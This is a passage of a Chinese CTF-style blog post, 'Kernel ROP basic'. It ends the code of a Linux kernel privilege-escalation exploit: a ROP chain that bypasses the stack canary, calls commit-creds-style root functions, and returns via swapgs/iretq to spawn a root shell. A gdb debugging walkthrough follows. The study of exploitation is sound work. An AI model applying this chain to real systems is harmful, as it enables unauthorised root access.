class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++)<br>        rop_chain[i] = canary;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)get_root_privilige;<br>    rop_chain[i++] = SWAPGS_POPFQ_RET + offset;<br>    rop_chain[i++] = <span class="hljs-number">0</span>;<br>    rop_chain[i++] = IRETQ_RET + offset;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)get_root_shell;<br>    rop_chain[i++] = user_cs;<br>    rop_chain[i++] = user_rflags;<br>    rop_chain[i++] = (user_sp &amp; <span class="hljs-number">0xfffffffffffffff0</span>) + <span class="hljs-number">8</span>;<br>    rop_chain[i++] = user_ss;<br><br>    write(fd, rop_chain, <span class="hljs-number">0x100</span>);<br>    core_copy_func(fd, <span class="hljs-number">0xffffffffffff0000</span> | <span class="hljs-number">0x100</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="跟踪调试"><a href="#跟踪调试" class="headerlink" title="跟踪调试"></a>跟踪调试</h3><p>跟踪一下rop链执行的过程（最好每一步都打一个断点，内核态进入用户态的时候ni会直接继续执行）</p>
+<p><em><strong>start.sh中的kaslr选项改为nokaslr才是关闭地址随机化！！！</strong></em></p>
+<p>调试内核时的.gdbinit：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">source /home/eurus/gef/gef.py<br><br>add-symbol-file /home/eurus/give_to_player/vmlinux<br>set architecture i386:x86-64<br>add-symbol-file /home/eurus/give_to_player/core/core.ko 0xffffffffc0000000 <br>b*0xffffffffc0000131<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p><strong>内核态</strong>：开始执行ROP链</p>
+<img src="/2023/08/03/Kernel-ROP-basic/pc1.png" srcset="/img/loading.gif" lazyload class title="pc1">
+
+<p>栈布局</p>
+<img src="/2023/08/03/Kernel-ROP-basic/stack.png" srcset="/img/loading.gif" lazyload class title="stack">
+</li>
+<li><p><strong>内核态执行用户态函数</strong>：进行提权</p>
+<img src="/2023/08/03/Kernel-ROP-basic/pc2.png" srcset="/img/loading.gif" lazyload class title="pc2">
+</li>
+<li><p><strong>内核态</strong>：执行swapgs和iretq</p>
+<img src="/2023/08/03/Kernel-ROP-basic/pc3.png" srcset="/img/loading.gif" lazyload class title="pc3">
+</li>
+<li><p><strong>用户态</strong>：拿shell</p>
+<img src="/2023/08/03/Kernel-ROP-basic/pc4.png" srcset="/img/loading.gif" lazyload class title="pc4"></li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Kernel/" class="category-chain-item">Kernel</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Kernel/ROP/" class="category-chain-item">ROP</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/kernel/" class="print-no-link">#kernel</a>
+      
+        <a href="/tags/rop/" class="print-no-link">#rop</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Kernel ROP basic</div>
+      <div>http://akaieurus.github.io/2023/08/03/Kernel-ROP-basic/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Eurus</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年8月3日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/08/04/kernel-rop-ret2usr/" title="Kernel ROP ret2usr">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Kernel ROP ret2usr</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/06/27/ret2dlresolve/" title="ret2dlresolve">
+                        <span class="hidden-mobile">ret2dlresolve</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
